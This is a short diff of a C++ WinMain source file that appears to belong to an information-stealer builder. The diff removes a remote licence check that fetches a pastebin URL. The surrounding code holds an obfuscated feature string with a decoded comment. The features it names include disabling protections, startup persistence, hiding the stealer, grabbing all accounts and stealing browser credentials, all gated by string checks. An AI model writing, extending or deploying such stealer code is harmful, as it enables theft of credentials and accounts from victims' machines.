@@ -82,11 +82,6 @@ INT WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR strCmdLine, INT)
     string License = "[zbuilder{zbuilder}]";
     if (true)
     {
-        string FreeVersion = DownloadString(XorStr("https://pastebin.com/raw/Gc5ys6R2"));
-        if (!(FreeVersion.find(XorStr("0")) != string::npos))
-        {
-            return 1;
-        }
         string Feature = decrypt("[QvfnoyrCebg:(A)]--[Genpre:(A)]--[Erpbire:(A)]--[TrgNyyNppf:(A)]--[QryrgrTG:(A)]--[FgnegHc:(A)]--[UvqrFgrnyre:(A)]--[OebjfrePerqf:(A)]");
         //string Feature = "[DisableProt:(N)]--[Tracer:(Y)]--[Recover:(N)]--[GetAllAccs:(N)]--[DeleteGT:(N)]--[StartUp:(N)]--[HideStealer:(N)]--[BrowserCreds:(N)]";
         if (Feature.find(XorStr("[DisableProt:(Y)]")) != string::npos)
